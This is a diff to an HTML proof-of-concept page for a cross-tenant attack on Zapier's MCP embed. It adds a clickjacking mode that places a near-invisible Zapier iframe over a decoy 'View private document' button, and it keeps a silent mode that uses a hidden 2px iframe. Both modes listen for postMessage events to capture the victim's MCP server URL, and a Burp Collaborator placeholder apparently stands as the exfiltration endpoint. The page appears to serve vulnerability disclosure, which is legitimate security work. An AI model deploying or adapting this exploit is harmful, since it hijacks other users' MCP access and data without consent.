@@ -2,20 +2,71 @@
 <meta charset="utf-8">
 <title>Zapier MCP Embed cross-tenant PoC</title>
 <h1>Zapier MCP Embed cross-tenant PoC</h1>
-<p>Open this page while signed in to Zapier as the victim. Do not click inside the embed.</p>
+<p id="instructions"></p>
 <pre id="status">Waiting for the embed to disclose the victim MCP server URL...</pre>
-<iframe
-  src="https://mcp.zapier.com/embed?embedId=REPLACE_WITH_ATTACKER_EMBED_ID"
-  width="2"
-  height="2"
-  aria-hidden="true"
-  tabindex="-1"
-  style="position:fixed;right:0;bottom:0;width:2px;height:2px;border:0;opacity:0.01;pointer-events:none"
-></iframe>
+<div id="stage">
+  <button id="decoy" type="button">View private document</button>
+  <iframe
+    id="embed"
+    src="https://mcp.zapier.com/embed?embedId=REPLACE_WITH_ATTACKER_EMBED_ID"
+  ></iframe>
+</div>
 <script>
 const COLLABORATOR = 'REPLACE_WITH_BURP_COLLABORATOR_DOMAIN';
 const status = document.getElementById('status');
+const instructions = document.getElementById('instructions');
+const stage = document.getElementById('stage');
+const iframe = document.getElementById('embed');
+const decoy = document.getElementById('decoy');
+const query = new URLSearchParams(location.search);
+const clickjack = query.get('mode') === 'clickjack';
+const x = Number(query.get('x') || 320);
+const y = Number(query.get('y') || 280);
+const opacity = Math.max(0.01, Math.min(1, Number(query.get('opacity') || 0.01)));
 let sent = false;
+
+if (clickjack) {
+  instructions.textContent = 'Click “View private document” once.';
+  Object.assign(stage.style, {
+    position: 'relative',
+    width: '640px',
+    height: '500px',
+    overflow: 'hidden',
+  });
+  Object.assign(decoy.style, {
+    position: 'absolute',
+    left: `${x}px`,
+    top: `${y}px`,
+    transform: 'translate(-50%, -50%)',
+    zIndex: '1',
+    padding: '14px 24px',
+    font: '600 16px system-ui',
+  });
+  Object.assign(iframe.style, {
+    position: 'absolute',
+    inset: '0',
+    width: '640px',
+    height: '500px',
+    border: '0',
+    opacity: String(opacity),
+    zIndex: '2',
+    pointerEvents: 'auto',
+  });
+  status.textContent = 'Clickjacking mode: waiting for the real Zapier sign-in control to receive the decoy click...';
+} else {
+  instructions.textContent = 'Silent mode: open this page while the victim MCP session is available to third-party frames.';
+  decoy.hidden = true;
+  Object.assign(iframe.style, {
+    position: 'fixed',
+    right: '0',
+    bottom: '0',
+    width: '2px',
+    height: '2px',
+    border: '0',
+    opacity: '0.01',
+    pointerEvents: 'none',
+  });
+}
 
 window.addEventListener('message', (event) => {
   if (event.origin !== 'https://mcp.zapier.com' || sent) return;
